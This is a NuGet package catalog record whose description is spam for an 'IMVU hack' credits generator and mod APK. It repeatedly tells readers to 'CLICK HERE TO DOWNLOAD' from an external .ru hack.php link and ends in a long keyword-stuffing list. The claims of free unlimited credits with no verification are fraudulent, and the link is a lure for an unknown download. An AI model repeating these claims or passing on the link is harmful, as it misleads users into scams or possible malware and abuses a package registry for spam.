{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.09.46.44/_imvu-hack-working-2022-version-bbw.6.1.58.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "fcc9c07d-13e6-4cb3-a3eb-764b2579d8be",
  "catalog:commitTimeStamp": "2022-01-26T09:46:44.8272592Z",
  "created": "2022-01-26T09:43:47.197Z",
  "description": "# _IMVU hack Working 2022 Version bbw\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://2.bltadwin.ru/hack.php](http://2.bltadwin.ru/hack.php)\n\n\nDownload Apk Latest Version of IMVU MOD, The Social App of Android, This Mod Apk Includes Unlimited Money, Coins, Free Shopping, Premium Support. % Undetectable- IMVU Credits hack - how to get Get Free Credits for IMVU Credits IMVU coin generator no human verification IMVU Credits cheats android. imvu credits is your free app to generate as much free credits as you want in your IMVU account. App features: Learn how to generate free imvu credits.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://2.bltadwin.ru/hack.php](http://2.bltadwin.ru/hack.php)\n\nMy Imvu Legends site is being white Actively created without anyone else, so my Imvu Legends Hacks Generator is completely streamlined and consistently up to date. You can share my Imvu Legends site with every one of your companions so you can partake in your new skins together. The IMVU Credits Cheats have plenty of advanced features making every step of generating credits easier for you. Simply enter a username, and select an amount of coins to receive and our algorithm will do the rest of the work. Typically our users receive their credits instantly, but sometimes there's a five minute delay. Imvu Hack free download - Hack the Universe, IMVU Toolbar, Sygate Personal Firewall, and many more programs.\n\nimvu hack 2021, imvu hack account generator, imvu hack tool, imvu hacked client, imvu hack credits, imvu hack pc, imvu hack 2022, imvu hack download, imvu hack ios, imvu hack apk, imvu hack app, imvu hack apk 2021, imvu hack app download, imvu hack access pass, imvu hack android, imvu hack apk android, best imvu hack, baixar imvu hack, hack imvu bez podawania numeru, imvu hack.com, imvu hack codes, imvu hack cydia, imvu credit hack 2021, imvu clothes hack, imvu credit hack download, imvu credit hack no human verification, credits hack imvu, imvu hack download pc, imvu hack download ios, imvu hack dinheiro infinito 2021, imvu hack dinheiro infinito 2020, imvu hack dinheiro infinito 2021 download, imvu hack dinheiro infinito, imvu hack download apk, imvu hack unlimited credits, imvu hack exploit, imvu easy hack, imvu hack tool pro edition, imvu easy credits hack, imvu earn credits hack, imvu e hac, hack imvu en español, imvu hack followers, imvu hack for android, imvu hack for pc, imvu hack for ios, imvu free hack download, imvu hack free credits, imvu hack apk free download, imvu free credits hack no human verification, imvu hack generator, imvu hack generator no human verification, imvu hack game download, imvu game hacker, imvu credits hack generator no survey, imvu credits hack generator download free, imvu hack online.game calls.com, imvu hack happymod, imvu credits hack-how to get free unlimited, imvu hack no human verification, imvu hack without human verification, imvu credits hack how to get unlimited, imvu credits hack without human verification, imvu hack ios no human verification, hack imvu, hack imvu credits, imvu hack ios jailbreak, imvu hack ios download, imvu hack ios no jailbreak, imvu hack iphone, imvu credits hack ios, imvu hack app ios, can i hack imvu, imvu hack jailbreak, juego imvu hack, imvu hack mod, imvu hack link, imvu hack login, imvu likes hack, imvu hack mod apk download, imvu hack money, imvu hack mod apk, imvu hack mod download, imvu money hack apk, imvu money hack 2020, imvu mobile hack, imvu money hack 2021, imvu mod unlimited credits, imvu hack no verification, imvu hack no survey, imvu credit hack no verification, imvu credits hack no survey, imvu coin hack no human verification, imvu hack online, imvu hack on computer, imvu hack online.games recalls.com, imvu online hack generator, imvu credit hack on computer, imvu credit hack on pc, imvu credit hack online, imvu hack mac, imvu credits hack pc, imvu generator password hack, imvu promo credits hack, imvu pc hack, imvu hack reddit, ",
  "id": "_IMVU-hack-Working-2022-Version-bbw",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T09:46:22.85Z",
  "listed": true,
  "packageHash": "dtLj9XcFkVLNawsCkBltQ5dXajJVOASLDS+TgjqU1KeaEqanWw5pNqqs6+ngjPeGVzLnLFTPQ2bI2pFFkWC7Ow==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11621,
  "published": "2022-01-26T09:43:47.197Z",
  "requireLicenseAcceptance": false,
  "title": "_IMVU-hack-Working-2022-Version-bbw",
  "verbatimVersion": "6.1.58",
  "version": "6.1.58",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.09.46.44/_imvu-hack-working-2022-version-bbw.6.1.58.json#ggqdachzyt.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1491,
      "fullName": "ggqdachzyt.nuspec",
      "length": 4440,
      "name": "ggqdachzyt.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.09.46.44/_imvu-hack-working-2022-version-bbw.6.1.58.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9470,
      "fullName": ".signature.p7s",
      "length": 9470,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}